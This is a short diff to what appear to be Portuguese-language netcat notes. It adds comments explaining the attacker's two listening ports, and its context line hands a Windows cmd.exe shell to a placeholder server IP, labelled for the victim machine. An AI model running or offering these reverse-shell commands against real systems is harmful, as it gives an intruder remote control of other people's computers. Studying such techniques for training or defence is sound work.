@@ -73,8 +73,8 @@ nc IP_DO_SERVIDOR 4000 -e c:\windows\system32\cmd.exe
  
  No atacante, trabalhar com 2 portas (Dois terminais abertos tambem)
  
- nc -vnlp 4000
- nc -vnlp 5000
+ nc -vnlp 4000    (Uma porta sera usada para interagir com o host remoto - Digitar os comandos)
+ nc -vnlp 5000    (Outra porta sera usada para exibir a saida dos comandos)
     
  Na vitima:
  
